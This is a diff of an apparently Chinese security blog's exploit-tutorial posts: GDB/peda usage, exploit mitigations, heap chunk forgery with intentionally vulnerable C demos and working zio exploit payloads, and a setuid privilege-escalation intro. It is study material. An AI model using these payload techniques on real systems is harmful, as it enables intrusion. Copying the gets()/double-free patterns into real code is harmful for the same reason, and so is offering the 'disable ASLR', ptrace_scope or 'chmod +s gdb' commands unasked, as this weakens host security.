+   0x80483a6 &lt;system@plt+6&gt;:    push   0x10
+   0x80483ab &lt;system@plt+11&gt;:    jmp0x8048370
+   0x80483b0 &lt;__gmon_start__@plt&gt;:    jmpDWORD PTR ds:0x804a00c
+   0x80483b6 &lt;__gmon_start__@plt+6&gt;:    push   0x18
+   0x80483bb &lt;__gmon_start__@plt+11&gt;:    jmp0x8048370
+   0x80483c0 &lt;__libc_start_main@plt&gt;:    jmpDWORD PTR ds:0x804a010
+   0x80483c6 &lt;__libc_start_main@plt+6&gt;:    push   0x20
+   0x80483cb &lt;__libc_start_main@plt+11&gt;:    jmp0x8048370
+   0x80483d0 &lt;write@plt&gt;:    jmpDWORD PTR ds:0x804a014
 
 
 
-<div class="post-preview " style="background-image: url('')">
-    <a href="/2018/01/01/20180101-modbus协议扫描器设计与实现/">
-        <h2 class="post-title">
-            Modbus协议扫描器的分析
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2018-01-01
-        </p>
-        
-        <div class="post-content-preview">
-            <p>
-                modbus 协议分析
-Modbus Packet Structure 协议格式
+Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),
+t(binary), f(float), a(address), i(instruction), c(char) and s(string).
+Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes)
+举例
+x/3uh buf 
+表示从内存地址buf读取内容，
+h表示以双字节为一个单位，
+3表示三个单位，
+u表示按十六进制显示
+例子：
+n是个局部变量
+Breakpoint 1, main (argc=1, argv=0xbffff3a4) at calc.c:7
+7int n = atoi(argv[1]);
+(gdb) print &amp;n
+$1 = (int *) 0xbffff2ec
+(gdb) x 0xbffff2ec
+0xbffff2ec:0x00282ff4
+(gdb) print * (int *) 0xbffff2ec
+$2 = 2633716
+(gdb) x /4xw 0xbffff2ec
+0xbffff2ec:0x00282ff40x080484e00x000000000xbffff378
+(gdb) x /4dw 0xbffff2ec
+0xbffff2ec:26337161345138880-1073745032
+(gdb)
 
+设定参数，输入的参数设置
 
-
-Trans ID
-ProtoID(0)
-Length
-UnitID
-FunctCode
-Data
-len(0-253byte)
-
-
-
-
-
-
-
-\x00\x00
-\x00\x00
-\x00\x00    \x1..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-<div class="post-preview " style="background-image: url('')">
-    <a href="/2017/10/30/20171030-Pyhon执行cmd命令的若干方式/">
-        <h2 class="post-title">
-            Python执行系统命令方法
-        </h2>
-        <p class="post-meta">
-            <i class="fa fa-calendar" aria-hidden="true"></i> 2017-10-30
-        </p>
-        
-        <h3 class="post-subtitle">
-            一点一点学python
-        </h3>
-        
-        <div class="post-content-preview">
-            <p>
-                Python 执行系统命令的三种方法Python OS 库函数1os.system('ls')
-Python os popen 库函数打开一个管道，然后将命令返回结果输出到日志。
-12popen(command [, mode='r' [, bufsize]]) -&gt; pipeOpen a..
-            </p>
-        </div>
-    </a>
-
-</div>
-
-<hr>
-
-
-
-
-<!-- 翻页 pager -->
-
-<ul class="pager">
-    
-    <li class="previous">
-        <a href="/">&larr; Newer Posts</a>
-    </li>
-    
-    
-    <li class="next">
-        <a href="/page/3/">Older Posts &rarr;</a>
-    </li>
-    
+pset arg &apos;cyclic_pattern(300)&apos;
+</code></pre><h1 id="linux-指令"><a href="#linux-指令" class="headerlink" title="linux 指令"></a>linux 指令</h1><h2 id="ldd"><a href="#ldd" class="headerlink" title="ldd"></a>ldd</h2><p>查询bin文件依赖</p>
+<pre><code>ubuntu:~/Desktop/pwntools_test$ ldd section_test
+linux-gate.so.1 =&gt;  (0xf7728000)
+libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7554000)
+/lib/ld-linux.so.2 (0x5660a000)
+</code></pre><h2 id="查询libc-so-版本号"><a href="#查询libc-so-版本号" class="headerlink" title="查询libc.so 版本号"></a>查询libc.so 版本号</h2><p><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">https://github.com/niklasb/libc-database</a>  用来查询libc版本信息内容，为exp提供方便</p>
+<p><a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a><br>网上查询版本</p>
+<h2 id="checksec-检测保护方式"><a href="#checksec-检测保护方式" class="headerlink" title="checksec 检测保护方式"></a>checksec 检测保护方式</h2><p>我们最常见的保护明星</p>
+<pre><code>CANARY: disabled
+FORTIFY   : disabled
+NX: ENABLED
+PIE   : disabled
+RELRO : Partial
+</code></pre><h3 id="GANNARY（栈保护）"><a href="#GANNARY（栈保护）" class="headerlink" title="GANNARY（栈保护）"></a>GANNARY（栈保护）</h3><p>Windows下以security cookie形式存在，这个选项表示栈保护功能有没有开启。</p>
+<p>栈溢出保护是一种缓冲区溢出攻击缓解手段，当函数存在缓冲区溢出攻击漏洞时，攻击者可以覆盖栈上的返回地址来让shellcode能够得到执行。当启用栈保护后，函数开始执行的时候会先往栈里插入cookie信息，当函数真正返回的时候会验证cookie信息是否合法，如果不合法就停止程序运行。攻击者在覆盖返回地址的时候往往也会将cookie信息给覆盖掉，导致栈保护检查失败而阻止shellcode的执行。在Linux中我们将cookie信息称为canary。</p>
+<p>gcc在4.2版本中添加了-fstack-protector和-fstack-protector-all编译参数以支持栈保护功能，4.9新增了-fstack-protector-strong编译参数让保护的范围更广。</p>
+<p>因此在编译时可以控制是否开启栈保护以及程度，例如：</p>
+<pre><code>gcc -fno-stack-protector -o test test.c  //禁用栈保护
+gcc -fstack-protector -o test test.c   //启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码
+gcc -fstack-protector-all -o test test.c //启用堆栈保护，为所有函数插入保护代码
+</code></pre><h3 id="FORTIFY"><a href="#FORTIFY" class="headerlink" title="FORTIFY"></a>FORTIFY</h3><p>。。。。。。</p>
+<h3 id="NX（DEP）"><a href="#NX（DEP）" class="headerlink" title="NX（DEP）"></a>NX（DEP）</h3><p>堆栈不可执行，通过修改页属性，不能执行代码。NX即No-eXecute（不可执行）的意思，NX（DEP）的基本原理是将数据所在内存页标识为不可执行，当程序溢出成功转入shellcode时，程序会尝试在数据页面上执行指令，此时CPU就会抛出异常，而不是去执行恶意指令。</p>
+<p><img src="http://i.imgur.com/mwQwzQF.jpg" alt=""></p>
+<h3 id="ASLR（PIE）"><a href="#ASLR（PIE）" class="headerlink" title="ASLR（PIE）"></a>ASLR（PIE）</h3><p>一般情况下NX（Windows平台上称其为DEP）和地址空间分布随机化（ASLR）会同时工作。</p>
+<p>内存地址随机化机制（address space layout randomization)，有以下三种情况</p>
+<ul>
+<li>0 表示关闭进程地址空间随机化。</li>
+<li>1 表示将mmap的基址，stack和vdso页面随机化。</li>
+<li>2 表示在1的基础上增加栈（heap）的随机化。</li>
 </ul>
+<p>可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。</p>
+<p>Built as PIE：位置独立的可执行区域（position-independent executables）。这样使得在利用缓冲溢出和移动操作系统中存在的其他内存崩溃缺陷时采用面向返回的编程（return-oriented programming）方法变得难得多。</p>
+<p>liunx下关闭PIE的命令如下：</p>
+<p>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</p>
+<p>确认ASLR是否已经被打开，”2”表示已经打开</p>
+<p>[plain] view plaincopy<br>shanks@shanks-ubuntu:/home/shanks# cat /proc/sys/kernel/randomize_va_space<br>2  </p>
+<p>/proc/sys/kernel/randomize_va_space</p>
+<p>切换到root用户来做更新，直接使用sudo会出现下面结果</p>
+<p>In any ASLR enabled binary (and most normal binaries for that<br>matter) there has to be a way for the binary to ‘know’ where the libc functions<br>are at. The binary creates a PLT stub for functions used in the source. These<br>are <strong>always at a constant address</strong>. This PLT stub is essentially a wrapper<br>function for the actual function in libc. The GOT contains the actual adresses<br>in libc for the functions used in the program. The actual adresses change from<br>runtime to runtime, but pointers to the same function are <strong>always in the same<br>spot in the GOT</strong>.</p>
 
-
-        </div>
-        <!-- Sidebar Container -->
-        <div class="
-                col-lg-3 col-lg-offset-0
-                col-md-3 col-md-offset-0
-                col-sm-12
-                col-xs-12
-                sidebar-container
-            ">
-
-            <!-- About Me -->
-            <section class="visible-md visible-lg" style="padding: 0 18px">
-                <div class="short-about">
-                    <!--侧边栏头像-->
-                    
-                    <h5><a href="/about/">拾荒者CD</a></h5>
-                    
-                    <hr>
-                    <!-- SNS Link 社交 -->
-                    <ul class="list-inline">
-                        
-                        
-                        
-
-                        
-
-                        
-
-                        
-
-                        
-                    </ul>
-                </div>
-            </section>
-
-            <!-- Featured Tags  标签 -->
-            
-
-            
-
-        </div>
+      
     </div>
-</div>
+    <footer class="article-footer">
+      <a data-url="http://gumeng.fun/2018/06/15/20180615-GDB_peda插件使用指南/" data-id="cl3ej0qu20015q4vkg2bpee14" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li></ul>
 
-<!-- Footer -->
-<!-- Footer -->
-<footer>
-    <div class="container">
-        <div class="row">
-            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
-                <br>
-                <ul class="list-inline text-center">
-                
-                
-                
+    </footer>
+  </div>
+  
+</article>
 
-                
 
-                
+  
+    <article id="post-20180615-Linux下的堆块伪造" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/15/20180615-Linux下的堆块伪造/" class="article-date">
+  <time datetime="2018-06-15T01:50:08.000Z" itemprop="datePublished">2018-06-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a>
+  </div>
 
-                
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/15/20180615-Linux下的堆块伪造/">Linux Pwn 之堆块伪造技术</a>
+    </h1>
+  
 
-                
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>借鉴下别人的文章，如有冒犯，还望多多包涵</p>
+<h1 id="Linux下的堆块伪造"><a href="#Linux下的堆块伪造" class="headerlink" title="Linux下的堆块伪造"></a>Linux下的堆块伪造</h1><p>这是一个基本的堆利用技巧，很多堆利用的地方都会用到。比如double free。<br>这种利用方式的出现是由于unlink的check机制的出现。这里主要从堆溢出和double free两个角度谈一下。</p>
+<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>1.ptmalloc的相邻空块合并原则。<br>2.堆chunk本身的结构机制。</p>
+<h2 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h2><p>堆chunk判断一个块是否为空仅仅依赖于相邻后块的<strong>prev_size</strong>和<strong>最低flag位</strong>。<br>如果在堆上构造合理的堆块结构，那么堆管理机制就会误以为我们的伪造的堆块是真正的空堆块。<br>当释放掉相邻的后块时（这个块是真的），就会触发空块合并。也就达成了堆块伪造的目的。</p>
+<h2 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>有两个相邻的堆块</span><br><span class="line"><span class="number">2.</span>第一个堆块可溢出第二个</span><br><span class="line"><span class="number">3.</span>释放第二个堆，即可触发。</span><br></pre></td></tr></table></figure>
+<p>这种是最常见的利用，即有check的堆溢出利用。</p>
+<p>或者</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>有一个已分配的堆</span><br><span class="line"><span class="number">2.</span>有一个指向堆上的可控指针</span><br><span class="line"><span class="number">3.</span>free参数可控</span><br></pre></td></tr></table></figure>
+<p>这种情况下，是在分配的一大块堆中强行构造出两块chunk。然后利用那个指向堆上的可控指针来实现free触发漏洞。<br>这其实是一种double free的利用方式，因为如果你分配了两块堆，然后把这两块堆都释放之后，这些内存会合并到top chunk中。当再次分配堆的时候，还是使用这些内存地址。</p>
+<p>那么如果我们进行以下操作：</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>分配两个堆</span><br><span class="line"><span class="number">2.</span>释放掉这两个堆</span><br><span class="line"><span class="number">3.</span>分配一个可以包含住前面两个堆的大堆块</span><br><span class="line"><span class="number">4.</span>写入这个大堆块构造两个伪chunk</span><br><span class="line"><span class="number">5.</span>通过第<span class="number">2</span>步中释放两个堆</span><br></pre></td></tr></table></figure>
+<p>这样对于初始的两个堆来说，就像是double free了，当然本质还是堆块伪造。</p>
+<h2 id="利用的效果"><a href="#利用的效果" class="headerlink" title="利用的效果"></a>利用的效果</h2><p>如果成功的使用了伪造堆，那么达到的效果是什么呢？首先，是不可能像unlink利用一样任意地址写了。<br>因为对于目前的ptmalloc来说，有如下check：<br>current-&gt;fd-&gt;bd!=current;<br>current-&gt;bd-&gt;fd!=current;<br>为了过掉这个检验我们会用一个指向堆块的全局指针的地址的一个偏移作为伪chunk的fd。<br>fd=ptr-12;<br>bd=ptr-8;<br>然后在断链的过程中，就会把<strong>ptr</strong>的值改成<strong>&amp;ptr-12</strong>,感觉很鸡肋是吧？<br>毕竟费这么大力气只是把一个全局变量的值给改成了他的地址－0xC，但是这个东西确实是这么去利用的。<br>在CTF中会跟其他的漏洞或功能结合去使用。</p>
+<h2 id="两个演示的DEMO"><a href="#两个演示的DEMO" class="headerlink" title="两个演示的DEMO"></a>两个演示的DEMO</h2><p>为了具体的说明问题，这里写了两个demo演示效果。</p>
+<h3 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h3><figure class="highlight plain"><figcaption><span>*global[80];</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">void *global[80];</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *p1,*p2;</span><br><span class="line">    p1=malloc(200);</span><br><span class="line">    p2=malloc(200);</span><br><span class="line">    global[40]=p1;</span><br><span class="line">    printf(&quot;before exploit:%x\n&quot;,global[40]);</span><br><span class="line">    puts(&quot;read&quot;);//for debug</span><br><span class="line">    gets(p1);//overflow</span><br><span class="line">    free(p2);</span><br><span class="line">    printf(&quot;after exploit:%x\n&quot;,global[40]);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这是对应于第一种堆溢出覆盖下一块堆的情况的，如果使用下面的exp就会发现global中malloc返回的地址已经变成了 global[40]本身的地址－0xC</p>
+<figure class="highlight plain"><figcaption><span>zio import *</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">io=zio(&apos;./h1&apos;,timeout=9999)</span><br><span class="line">#io.gdb_hint()</span><br><span class="line">io.read_until(&apos;read&apos;)</span><br><span class="line">sc=l32(0x0)+l32(0xc9)+l32(0x804A100-0xc)+l32(0x0804A100-0x8)+&apos;a&apos;*(200-16)+l32(0xc8)+l32(0xd0)</span><br><span class="line">io.writeline(sc)</span><br><span class="line">io.read()</span><br></pre></td></tr></table></figure>
+<h3 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h3><figure class="highlight plain"><figcaption><span>*global[40];</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">  void *p1,*p2,*p3;</span><br><span class="line">  p1=malloc(200);</span><br><span class="line">  p2=malloc(200);</span><br><span class="line">  global[20]=p1;</span><br><span class="line">  free(p1);</span><br><span class="line">  free(p2);</span><br><span class="line">  p3=malloc(500);</span><br><span class="line">  puts(&quot;get&quot;);//for debug</span><br><span class="line">  gets(p3);</span><br><span class="line">  free(p2);</span><br><span class="line">  return;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这个Demo展示的是double free。可以看到对于p2指针来说确实是释放了两次。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from zio import *</span><br><span class="line">io=zio('./h2',timeout=<span class="number">99999</span>)</span><br><span class="line">#io.gdb_hint()</span><br><span class="line">io.read_until('get')</span><br><span class="line">sc=l32(<span class="number">0x0</span>)+l32(<span class="number">201</span>)+l32(<span class="number">0x804a0b0</span><span class="number">-0xC</span>)+l32(<span class="number">0x804a0b0</span><span class="number">-0x8</span>)+'a'*(<span class="number">200</span><span class="number">-16</span>)+l32(<span class="number">200</span>)+l32(<span class="number">0x128</span>)</span><br><span class="line">io.writeline(sc)</span><br><span class="line">io.read()</span><br></pre></td></tr></table></figure>
+<p>这个exp就可以实现利用，感觉这个exp的伪堆块构造要比上面Demo更复杂一些。这个exp我搞了好久，因为不知道为什么一直会触发free的check导致程序崩溃。后来查了一些资料终于明白了，必须要保证你分配的堆与你在其中构造的两个堆块的大小完全一致。<br>比方说我这里是malloc(500)，调试一下发现分配了504（鬼知道为什么），那么就是504-8-200=0x128，如果不跟分配的堆块边境符合的话就会触发check从而crash掉。</p>
+<p>by:Ox9A82</p>
 
-                </ul>
-                <p class="copyright text-muted">
-                    Copyright &copy; 拾荒者CD 2022
-                    <br>
-                    <span id="busuanzi_container_site_pv" style="font-size: 12px;">PV: <span id="busuanzi_value_site_pv"></span> Times</span>
-                    <br>
-                    Theme by <a href="https://haojen.github.io/">Haojen Ma</a>
-                </p>
-
-            </div>
-        </div>
+      
     </div>
+    <footer class="article-footer">
+      <a data-url="http://gumeng.fun/2018/06/15/20180615-Linux下的堆块伪造/" data-id="cl3ej0qu4001cq4vkch7wgee7" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-20180615-peda-pwntools安装使用问题" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/15/20180615-peda-pwntools安装使用问题/" class="article-date">
+  <time datetime="2018-06-15T01:50:08.000Z" itemprop="datePublished">2018-06-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/tools/">tools</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/15/20180615-peda-pwntools安装使用问题/">Peda 安装指南</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="Peda-安装使用指南"><a href="#Peda-安装使用指南" class="headerlink" title="Peda 安装使用指南"></a>Peda 安装使用指南</h1><p>参考连接：<br><a href="http://www.ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf" title="peda-pdf" target="_blank" rel="noopener">http://www.ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf</a></p>
+<p>Peda的创作者是Long Le ，vns security的研究员，</p>
+<h2 id="GDB-peda安装"><a href="#GDB-peda安装" class="headerlink" title="GDB-peda安装"></a>GDB-peda安装</h2><p>1 需要安装packages </p>
+<blockquote>
+<p>sudo apt-get install nasm micro-inetd</p>
+</blockquote>
+<p>2 可选安装</p>
+<blockquote>
+<p>sudo apt-get install libc6-dbg vim ssh</p>
+</blockquote>
+<p>3 安装peda-tool </p>
+<blockquote>
+<p>Download peda.tar.gz at: <a href="http://ropshell.com/peda/" target="_blank" rel="noopener">http://ropshell.com/peda/</a></p>
+</blockquote>
+<p>本地打开</p>
+<blockquote>
+<p>$ tar zxvf peda.tar.gz</p>
+</blockquote>
+<p>创建 本地’.gdbinit’</p>
+<blockquote>
+<p>$ echo “source ~/peda/peda.py” &gt;~/.gdbinit</p>
+</blockquote>
+<p>本地可用的example</p>
+<blockquote>
+<p>Download bhus12-workshop.tar.gz at:</p>
+</blockquote>
+<blockquote>
+<p><a href="http://ropshell.com/peda/" target="_blank" rel="noopener">http://ropshell.com/peda/</a></p>
+</blockquote>
+<h2 id="pwntools-error"><a href="#pwntools-error" class="headerlink" title="pwntools error"></a>pwntools error</h2><p>Thanks for contributing to Pwntools!</p>
+<p>When reporting an issue, be sure that you are running the latest released version of pwntools (pip install –upgrade pwntools).</p>
+<p>Please verify that your issue occurs on 64-bit Ubuntu 14.04. You can use the Dockerfile on docker.io for quick testing.</p>
+<pre><code>$ docker pull pwntools/pwntools:stable
+$ docker run -it pwntools/pwntools:stable
+</code></pre><p>If possible, provide a proof-of-concept which demonstrates the problem. Include any binaries or scripts necessary to reproduce the issue, and please include the full debug output via setting the environment variable PWNLIB_DEBUG=1.</p>
+<p>pwntool gdb attach </p>
+<p>82<br>down vote<br>accepted<br>In Maverick Meerkat (10.10) Ubuntu introduced a patch to disallow ptracing of non-child processes by non-root users - ie. only a process which is a parent of another process can ptrace it for normal users - whilst root can still ptrace every process. Hence why you can use gdb to attach via sudo still.</p>
+<p>You can temporarily disable this restriction (and revert to the old behaviour allowing your user to ptrace (gdb) any of their other processes) by doing:</p>
+<p>echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope<br>To permanently allow it edit /etc/sysctl.d/10-ptrace.conf and change the line:</p>
+<p>kernel.yama.ptrace_scope = 1<br>To read</p>
+<p>kernel.yama.ptrace_scope = 0<br>For some background on why this change was made, see the Ubuntu wiki</p>
+<p>.plt 表示一个函数在libc中的偏移位置，如下代码:</p>
+<p>.plt:080483A0 ; ssize_t write(int fd, const void *buf, size_t n)<br>.plt:080483A0 _write          proc near               ; CODE XREF: main+2Ap<br>.plt:080483A0                 jmp     ds:off_804A010<br>.plt:080483A0 _write          endp</p>
+<p>指向了got.plt中的地址，got.plt则指向了plt的实际调用地址，外部调用函数偏移量：<br>.got.plt:0804A010 off_804A010     dd offset write         ; DATA XREF: _writer</p>
+<p>外部函数的偏移量则为：</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://gumeng.fun/2018/06/15/20180615-peda-pwntools安装使用问题/" data-id="cl3ej0qu7001gq4vkzw8szh0a" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-20180615-gdb 无法attach进程" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/06/15/20180615-gdb 无法attach进程/" class="article-date">
+  <time datetime="2018-06-15T01:50:08.000Z" itemprop="datePublished">2018-06-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/tools/">tools</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/06/15/20180615-gdb 无法attach进程/">GDB 无法attach进程</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p> gdb attach fails with ptrace: Operation not permitted<br>Today I ran into a weird problem. I could not attach to my own process with gdb. The process ran under my UID, but gdb refused to attach. This is a problem of wrong permissions, although /proc/[pid]/status looked ok:</p>
+<figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Uid:   <span class="number"> 1000 </span>  <span class="number"> 1000 </span>  <span class="number"> 1000 </span>   1000</span><br><span class="line">Gid:   <span class="number"> 1000 </span>  <span class="number"> 1000 </span>  <span class="number"> 1000 </span>   1000</span><br></pre></td></tr></table></figure>
+<p>1<br>2<br>3<br>4<br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Uid:   <span class="number"> 1000 </span>  <span class="number"> 1000 </span>  <span class="number"> 1000 </span>   1000</span><br><span class="line">Gid:   <span class="number"> 1000 </span>  <span class="number"> 1000 </span>  <span class="number"> 1000 </span>   1000</span><br></pre></td></tr></table></figure></p>
+<p>I am the owner but cannot attach? Well, I launched gdb as root and could attach. Strange. Without digging deeper into this, my dirty workaround was this:</p>
+<p>sudo chmod +s /usr/bin/gdb<br>1<br>sudo chmod +s /usr/bin/gdb</p>
+<p>Update: Thanks to Mario, who pointed out, that the reason is the Kernel hardening stuff build into the Ubuntu kernel. See his comment how to fix the problem permanently.</p>
+<p>why i cannot get a really address for<br>    #</p>
+<pre><code>#0  0xf76f9c89 in __kernel_vsyscall ()
+#1  0xf75fbb13 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:84
+#2  0x080484df in vulnerable_function ()
+#3  0x0804851d in main ()
+#4  0xf753e637 in __libc_start_main (main=0x804850a &lt;main&gt;, argc=0x1, 
+argv=0xffde0464, init=0x8048540 &lt;__libc_csu_init&gt;, 
+fini=0x80485b0 &lt;__libc_csu_fini&gt;, rtld_fini=0xf770a8a0 &lt;_dl_fini&gt;, 
+stack_end=0xffde045c) at ../csu/libc-start.c:291
+#5  0x08048411 in _start ()
+#
+</code></pre>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://gumeng.fun/2018/06/15/20180615-gdb 无法attach进程/" data-id="cl3ej0qu8001jq4vkzaf3lqlo" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-20180115-linux提权之setuid方法" class="article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/01/15/20180115-linux提权之setuid方法/" class="article-date">
+  <time datetime="2018-01-15T01:50:08.000Z" itemprop="datePublished">2018-01-15</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/Pwn/">Pwn</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/01/15/20180115-linux提权之setuid方法/">Linux 提权之setuid使用提权</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <blockquote>
+<p>自己收集部分内容，如有错误，请联系<a href="mailto:youngtala@gmail.com" target="_blank" rel="noopener">youngtala@gmail.com</a></p>
+</blockquote>
+<h1 id="linxu-setuid-安全威胁"><a href="#linxu-setuid-安全威胁" class="headerlink" title="linxu setuid 安全威胁"></a>linxu setuid 安全威胁</h1><h2 id="setuid-机制"><a href="#setuid-机制" class="headerlink" title="setuid 机制"></a>setuid 机制</h2><p>一般查看linux下某命令权限</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">root@localhost# ll /etc/passwd </span><br><span class="line"></span><br><span class="line">-rwsr-xr-x <span class="number">1</span> root root <span class="number">22960</span> Jul <span class="number">17</span> <span class="number">2017</span> /usr/bin/passwd</span><br></pre></td></tr></table></figure>
+<p>passwd命令有一个特殊的权限标记s ，存在于文件所有者的权限位上。这是一类特殊的权限SetUID ，当一个具有执行权限的文件设置SetUID权限后，用户执行这个文件时将以文件所有者的身份执行。</p>
+<p>举例：passwd命令具有SetUID权限，所有者为root（Linux中的命令默认所有者都是root），也就是说当普通用户使用passwd更改自己密码的时候，那一瞬间会实际以root形式执行，实际在以passwd命令所有者root的身份在执行，root当然可以将密码写入/etc/shadow文件，命令执行完成后该身份也随之消失。</p>
+<h2 id="setuid-安全威胁"><a href="#setuid-安全威胁" class="headerlink" title="setuid 安全威胁"></a>setuid 安全威胁</h2><p>setuid 可以理解为 临时 root用户的标志位，让普通用户可以以root身份临时打开所用的文件，因此我们可以借助这个标志位实现任意读写。</p>
+<p><strong>应用场景</strong>：</p>
+<p>任何用户都用vi编辑任何文件，一般情况下非root用户不可编辑 /etc/shadow文件,如果对vi命令setuid后，任何用户对vi的操作即为root的读写权限操作，造成密码篡改或删除</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>利用带有suid标志位的程序来实现提权，例如nmap就是</p>
